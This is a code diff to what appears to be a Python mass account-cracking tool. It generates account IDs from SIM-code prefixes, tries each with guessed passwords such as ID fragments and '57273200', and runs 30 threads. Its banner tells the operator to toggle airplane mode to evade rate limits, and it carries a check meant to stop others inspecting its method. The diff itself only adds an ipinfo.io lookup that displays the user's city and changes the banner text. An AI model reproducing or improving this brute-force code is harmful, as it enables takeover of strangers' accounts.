@@ -60,6 +60,15 @@ if not 'print' in open(first+'models.py','r').read():
 else:
     exit('\033[1;91mPLEASE TURN OFF YOUR LOCAL METHOD CAPTURE SYSTEM KIDZ')
 
+def get_current_city():
+    try:
+        response = requests.get('https://ipinfo.io/json')
+        data = response.json()
+        return data['city']
+    except Exception as e:
+        print("Error fetching current city:", e)
+        return None
+current_city = get_current_city()
 #-----------------------sdcard---------------------#
 def bithika():
     session=requests.session()
@@ -572,7 +581,7 @@ def RANDOM():
   with tred(max_workers=30) as king_xd:
     os.system('clear')
     tl = str(len(user))
-    ____banner____();print(f'{dot}IP ADDRESS{RED}  : {H}'+ip);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
+    ____banner____();print(f'{dot}YOUR CITY{RED}  : {H}'+current_city);print(f'{dot}METHOD{RED}    : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       ids = kode+guru
       pwv = [ids[:6],ids[:8],ids,'57273200']
@@ -620,7 +629,7 @@ def INDIA():
   with tred(max_workers=30) as king_xd:
     os.system('clear')
     tl = str(len(user))
-    ____banner____();print(f'{dot}IP ADDRESS{RED}  : {H}'+ip);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
+    ____banner____();print(f'{dot}YOUR CITY{RED}  : {H}'+current_city);print(f'{dot}METHOD{RED}    : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       ids = kode+guru
       pwv = [ids[:6],ids[:8],ids,'57273200']
@@ -668,7 +677,7 @@ def PAKISTAN():
   with tred(max_workers=30) as king_xd:
     os.system('clear')
     tl = str(len(user))
-    ____banner____();print(f'{dot}IP ADDRESS{RED}  : {H}'+ip);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
+    ____banner____();print(f'{dot}YOUR CITY{RED}  : {H}'+current_city);print(f'{dot}METHOD{RED}    : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       ids = kode+guru
       pwv = [ids[:6],ids[:8],ids,'57273200']
